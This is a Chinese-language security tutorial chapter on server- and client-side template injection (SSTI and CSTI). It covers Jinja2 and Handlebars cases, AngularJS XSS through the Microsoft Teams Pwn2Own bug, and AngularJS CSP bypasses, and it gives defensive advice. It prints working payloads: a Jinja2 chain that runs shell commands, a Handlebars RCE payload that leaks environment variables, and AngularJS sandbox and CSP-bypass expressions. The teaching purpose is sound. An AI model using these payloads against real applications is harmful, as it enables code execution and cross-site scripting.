---
sidebar_position: 16
---

# 前端的模板注入攻擊：CSTI

CSTI，全名為 Client Side Template Injection，直翻的話就是前端模板注入，那既然會特別加上前端，就代表說也有一個對應的後端版本，叫做 SSTI，全稱就只是把 Client 改成 Server。

在介紹前端的版本之前，我們先來看一下後端的。

## Server Side Template Injection

在寫後端的時候如果需要輸出 HTML，你可以選擇像是純 PHP 那樣直接輸出：

``` php
<?php
  echo '<h1>hello</h1>';
?>
```

但是當 HTML 裡面有部分內容是動態的話，程式碼就會變得愈來愈複雜。因此在真正的開發上，通常都會使用一種叫做模板引擎（template engine）的東西，這個我們在講 sanitization 的時候有稍微提過了。

舉例來說，我的部落格的文章頁面，有一部分的模板是這樣的：

``` html
<article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        <%= post.title %>
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="<%= date_xml(post.date) %>" itemprop="datePublished"><%= format_date_full(post.date) %></time>
        </span>
        <% if (post.categories && post.categories.length){ %>
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <%- (post._categories || post.categories).map(category =>
                    `<a class="article-category-link" href="${url_for(category.path)}">${category.name}</a>`)
                    .join('<span>></span>') %>
        </span>
        <% } %>
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
        <%- post.content %>
    </div>
</article>
```

在 render 的時候我只要傳入 `post` 這個物件，再搭配上模板，就可以渲染出一個完整的文章頁面。

而 template injection 代表的並不是「攻擊者可以操控像是 `post` 這些資料」，而是「攻擊者可以操控模板本身」。

例如說發行銷郵件的服務好了，通常公司都會把使用者的資料匯入到上面，然後設定自己的模板，例如說：

``` html
嗨嗨 {{name}}，我是公司的創辦人 Huli

不知道我們目前的產品你用的還習慣嗎？
如果不習慣的話，隨時可以跟我約個十分鐘的線上會議

可以點這個連結預約：<a href="{{link}}?q={{email}}">預約連結</a>

Huli
```

在公司設定的時候就可以控制模板的內容了，假設這個模板直接被後端拿去使用，以 Python 搭配 Jinja2 為例的話會是這樣：

``` python
from jinja2 import Template

data = {
    "name": "Peter",
    "link": "https://example.com",
    "email": "test@example.com"
}

template_str = """
嗨嗨 {{name}}，我是公司的創辦人 Huli

不知道我們目前的產品你用的還習慣嗎？
如果不習慣的話，隨時可以跟我約個十分鐘的線上會議

可以點這個連結預約：<a href="{{link}}?q={{email}}">預約連結</a>

Huli
"""
template = Template(template_str)
rendered_template = template.render(
    name=data['name'],
    link=data['link'],
    email=data['email'])
print(rendered_template)
```

最後印出的結果為：

``` html
嗨嗨 Peter，我是公司的創辦人 Huli

不知道我們目前的產品你用的還習慣嗎？
如果不習慣的話，隨時可以跟我約個十分鐘的線上會議

可以點這個連結預約：<a href="https://example.com?q=test@example.com">預約連結</a>

Huli
```

看起來沒什麼問題，但如果我們把 template 改一下呢？像是這樣：

``` python
from jinja2 import Template

data = {
    "name": "Peter",
    "link": "https://example.com",
    "email": "test@example.com"
}

template_str = """
Output: {{ 
    self.__init__.__globals__.__builtins__
    .__import__('os').popen('uname').read()
}}
"""
template = Template(template_str)
rendered_template = template.render(
    name=data['name'],
    link=data['link'],
    email=data['email'])
print(rendered_template)
```

輸出就會變成：`Output: Darwin`，而 Darwin 就是指令 `uname` 執行以後的結果。

簡單來講，你可以把 `{{}}` 裡面的東西看成是模板引擎會幫你執行的程式碼。

雖然說我們以前都只有簡單寫 `{{name}}`，但其實還可以做更多操作，例如說 `{{ name + email }}` 也是可以的。以上面的案例來看，就是從 `self` 開始一路用 Python 黑魔法讀到了 `__import__`，就可以 import 其他 module 進來，達成指令的執行。

像這種能夠讓攻擊者掌控模板的漏洞就叫做模板注入，發生在後端就叫 SSTI，在前端就叫做 CSTI。

防禦方式的話很簡單，就是不要把使用者的輸入當成是模板的一部分；如果無論如何都必須要這樣做的話，記得看看模板引擎是否有提供 sandbox 的功能，讓你在安全的環境下執行不信任的程式碼。

## SSTI 的實際案例

第一個來看 2016 年 Orange 在 Uber 發現的漏洞，他某天突然發現 Uber 寄來的信中有一個 `2`，才想起來他在姓名的欄位中輸入了 `{{ 1+1 }}`，這個是在找 SSTI 漏洞時很常見的技巧，就是在可以輸入的地方輸入一大堆 payload，從結果就可以看出是否有 SSTI 的問題。

而接著就是用了我們上面提到的手法去找有哪些變數可以用然後串接，因為 Uber 也是用 Jinja2，所以最後的 payload 跟我們剛剛寫的差不多，最後利用了 SSTI 達成了 RCE。

更詳細的過程可以參考：[Uber 遠端代碼執行- Uber.com Remote Code Execution via Flask Jinja2 Template Injection](http://blog.orange.tw/2016/04/bug-bounty-uber-ubercom-remote-code_7.html)

第二個則是 2019 年 Shopify 的 Handlebars SSTI，由 Mahmoud Gamal 回報。

Shopify 的商家後台有個功能是可以讓商家自訂要寄給使用者的信件（就跟我剛剛舉的例子很像啦），可以使用 `{{order.number}}` 這種語法來自訂內容。而後端是使用了 Node.js 搭配 Handlebars 這一套模板引擎。

因為 Handlebars 有一些保護措施而且比較複雜，所以駭客花了許多時間在嘗試該怎麼去攻擊，畢竟有 SSTI 是一回事，但並不是每個模板引擎都能夠弄到 RCE。

最後試出來的 payload 非常長：

``` js
{{#with this as |obj|}}
    {{#with (obj.constructor.keys "1") as |arr|}}
        {{#with obj.constructor.name as |str|}}
            {{#blockHelperMissing str.toString}}
              {{#with (arr.constructor (str.toString.bind "return JSON.stringify(process.env);"))}}
                  {{#with (obj.constructor.getOwnPropertyDescriptor this 0)}}
                      {{#with (obj.constructor.defineProperty obj.constructor.prototype "toString" this)}}
                          {{#with (obj.constructor.constructor "test")}}
                            {{this}}
                          {{/with}}
                      {{/with}}
                  {{/with}}
              {{/with}}
            {{/blockHelperMissing}}
        {{/with}}
  {{/with}}
{{/with}}
```

細節可以參考作者的原文：[Handlebars template injection and RCE in a Shopify app](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

## Client Side Template Injection

在瞭解了 SSTI 之後，想理解 CSTI 就更容易了，因為原理都類似，唯一的差別在這個模板是前端的模板。

咦？前端也有模板嗎？當然有！

例如說 Angular 就是一個，底下是 Angular [官網](https://angular.io/quick-start)給的範例：

``` js
// import required packages
import 'zone.js';
import { Component } from '@angular/core';
import { bootstrapApplication } from '@angular/platform-browser';

// describe component
@Component({
  selector: 'add-one-button', // component name used in markup
  standalone: true, // component is self-contained
  template: // the component's markup
  `
   <button (click)="count = count + 1">Add one</button> {{ count }}
  `,
})

// export component
export class AddOneButtonComponent {
  count = 0;
}

bootstrapApplication(AddOneButtonComponent);
```

可以清楚看到有一個叫做 `template` 的參數，如果你把 `{{ count }}` 改成 `{{ constructor.constructor('alert(1)')() }}`，就會看到一個 alert 視窗跳出來。

會用 `constructor.constructor('alert(1)')()` 是因為模板裡面沒辦法直接存取到 `window`，因此要透過 Function constructor 來建立新的 function。

在 Angular 文件裡的 [Angular's cross-site scripting security model](https://angular.io/guide/security#angulars-cross-site-scripting-security-model) 有寫說：

> Unlike values to be used for rendering, Angular templates are considered trusted by default, and should be treated as executable code. Never create templates by concatenating user input and template syntax. Doing this would enable attackers to inject arbitrary code into your application.

應該把 template 看作是可以執行的 code，永遠不要讓使用者可以控制 template。

話說你知道 AngularJS 跟 Angular 的差別嗎？

在 2010 年剛推出時叫做 AngularJS，那時的版本號都是 0.x.x 或是 1.x.x，但是版本號到了 2 以後，就改名叫做 Angular，使用上類似但是設計上整個重寫。我們之後基本上只會提到舊版的 AngularJS，因為它舊所以問題比較多，是很適合拿來輔助攻擊的函式庫。

在 AngularJS 剛推出的時候，也是一樣透過 `{{ constructor.constructor('alert(1)')() }}` 就可以執行任意程式碼，但後來在 1.2.0 版本開始加上 sandbox 機制，想盡辦法讓人不能接觸到 `window`，不過要比攻防的話，資安研究員可是不會輸的，陸續找到了一些繞過的方式。

就這樣不斷維持著被繞過然後加固 sandbox 後再被繞過的迴圈，AngularJS 終於宣布在 1.6 版以後全面移除 sandbox，原因是 sandbox 其實不是一個資安的 feature，如果你的 template 可以被控制，那要解決的應該是這個問題，而不是 sandbox。細節可以參考當初公告的文章：[AngularJS expression sandbox bypass](https://sites.google.com/site/bughunteruniversity/nonvuln/angularjs-expression-sandbox-bypass)，更多繞過的歷史可以看 [DOM based AngularJS sandbox escapes](https://portswigger.net/research/dom-based-angularjs-sandbox-escapes)。

在 AngularJS 1.x 的版本中，使用上更加方便容易，只需要一個 `ng-app` 的元素即可：

``` html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
</head>
<body>
  <div ng-app>
    {{ 'hello world'.toUpperCase() }}
  </div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
</body>
</html>
```

雖然說理想上整個前端都應該是 AngularJS 控制，跟後端的交流都是透過 API，後端完全不參與 view 的 render，但那時候 SPA 的概念也還不流行，許多網站還是讓後端負責 view 的 render，因此很可能會寫出以下程式碼：

``` php
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
</head>
<body>
  <div ng-app>
    Hello, <?php echo htmlspecialchars($_GET['name']) ?>
  </div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
</body>
</html>
```

直接在後端 render 的時候放入資料並且插入到 HTML 中。

雖然上面這段程式碼已經有把輸入做編碼了，但是 `{{ alert(1) }}` 中完全沒有不合法的字元，因此還是會導致 XSS 的發生。

防禦方式的話跟 SSTI 一樣，永遠不要把使用者的輸入直接當成模板內容的一部分，不然很容易出事。

## CSTI 的實際案例

舉一個熱騰騰的案例，一名來自日本的資安研究員 Masato Kinugawa 在 2022 年的 Pwn2Own 中示範了微軟通訊軟體 Teams 的 RCE 漏洞，只要傳一個訊息給對方，就能在對方的電腦上執行程式碼！這個漏洞在 Pwn2Own 上拿到了 15 萬美金的獎金，折合台幣約 480 萬。

Teams 的桌面版軟體是用 Electron 製作而成，因此本質上就是一個網頁，想要達成 RCE，第一步通常要先找到 XSS，讓你可以在網頁上執行 JavaScript 程式碼。

而 Teams 對於使用者的輸入當然也有做處理，前後端都有 sanitizer 把奇怪的東西拿掉，確保最後 render 出來的東西沒有問題。儘管可以控制部分的 HTML，但是許多屬性跟內容都被過濾掉了。

例如說就連 class 好了，也只允許部分的 class name。而 Masato 發現 sanitizer 對於 class name 的處理有一些操作空間，例如說有個規則是 `swift-*`，那 `swift-abc` 跟 `swift-;[]()'%` 都是允許的 class name。

可是只能操控 class name 有什麼用呢？

重點來了，Teams 的網頁是用 AngularJS 寫的，而 AngularJS 有一堆神奇的功能存在。有一個叫做 `ng-init` 的屬性可以用來初始化，像這樣：

``` html
<!DOCTYPE html>
<html lang="en">
<body>
  <div ng-app>
    <div ng-init="name='test'">
      {{ name }}
    </div>
  </div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
</body>
</html>
```

就會在頁面上顯示 `test`，由此可見 `ng-init` 裡面的程式碼是會被執行的。

所以如果你改成 `ng-init="constructor.constructor('alert(1)')()"`，就會跳一個 alert 出來。

那這個跟剛剛講的 class name 有什麼關係呢？因為這個 `ng-init` 居然也能用在 class name 裡面：

``` html
<div class="ng-init:constructor.constructor('alert(1)')()">
</div>
```

因此，結合前面講的 class name 的檢查規則，我們就可以構造出含有上面 payload 的 class name，成功執行 XSS。

原文其實還有一段是去找 AngularJS 怎麼解析 class name 以及針對這個版本的 AngularJS sandbox bypass，找到 XSS 之後要變成 RCE 也需要花費一番功夫，但因為這些跟這篇要講的 CSTI 無關所以就跳過了，很推薦大家去看原本的投影片：[How I Hacked Microsoft Teams and got $150,000 in Pwn2Own](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)

（話說 Masato 真的很強，很多篇技術文章都讓我歎為觀止，無論是對於前端、JavaScript 或是 AngularJS 的理解都是頂尖的，我有幸跟他共事過一陣子，近距離感受到他的厲害）

## AngularJS 與 CSP bypass

AngularJS 在實戰中最常被拿來利用的就是 CSP bypass 了，只要你能在 CSP 允許的路徑中找到 AngularJS，就有很大的機率能繞過，舉例來說：

``` html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="Content-Security-Policy" content="script-src https://cdnjs.cloudflare.com">
</head>
<body>
  <div ng-app ng-csp>
    <input id=x autofocus ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
</body>
</html>
```

CSP 算是嚴格，只允許了 `https://cdnjs.cloudflare.com`，但這使得我們可以引入 AngularJS，就變成了 XSS。

雖然看起來簡單容易，但仔細想一下會發現其實很不容易。你想想看，CSP 裡面並沒有 `unsafe-eval`，因此所有的字串都不能被當作程式碼執行，但如果是這樣的話，`ng-focus` 那裡面一大堆的字串是怎麼被執行的？這不就是把字串當程式碼執行嗎？

這就是 AngularJS 厲害的地方了，在預設的模式底下，AngularJS 會用 `eval` 之類的東西解析你傳進去的字串，但如果你加上了 [ng-csp](https://docs.angularjs.org/api/ng/directive/ngCsp)，就是告訴 AngularJS 切換到別的模式，它會用自己實作的直譯器（interpreter）去解析字串並執行相對應的動作。

因此，你可以想成是 AngularJS 自己實作了一套 `eval`，才能在不使用這些預設函式的狀況下把字串當作程式碼來執行。

之前在講 CSP 繞過的時候，我有提過藉由把路徑設定的嚴謹一點，可以「降低風險」，而不是「完全消除風險」，舉的例子是設定成 `https://www.google.com/recaptcha/`，而不是 `https://www.google.com`。

事實上在 GoogleCTF 2023 中，有一道題目就是要你繞過 `https://www.google.com/recaptcha/` 的 CSP，解法正是利用了 AngularJS，這就是為什麼我說路徑嚴謹可以降低風險，但沒辦法完全避免：

``` html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="Content-Security-Policy" content="script-src https://www.google.com/recaptcha/">
</head>
<body>
  <div
    ng-controller="CarouselController as c"
    ng-init="c.init()"
  >
  [[c.element.ownerDocument.defaultView.alert(1)]]
  <div carousel><div slides></div></div>

  <script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
</body>
</html>
```

如果對 AngularJS CSP bypass 有更多興趣，可以參考我以前寫過的：[自動化尋找 AngularJS CSP Bypass 中 prototype.js 的替代品](https://blog.huli.tw/2022/09/01/angularjs-csp-bypass-cdnjs/)，裡面有介紹另外一種繞過方式。

## 小結

這次講的 CSTI 也算是一種「不直接執行 JavaScript」的攻擊方式。

當你把輸出都做編碼以為很安全的時候，卻忘記自己前端有著 AngularJS，攻擊者只要用看似安全的 `{{}}` 就可以透過 CSTI 達成 XSS。

雖然說現在有 AngularJS 的網站已經越來越少了，也比較不會有人把使用者的輸入當作是 template 的一部分，但這世界不缺少漏洞，而是缺少發現，很多漏洞只是還沒被發現而已。

如果你家的服務有用 AngularJS，記得確定一下沒有 CSTI 的問題。

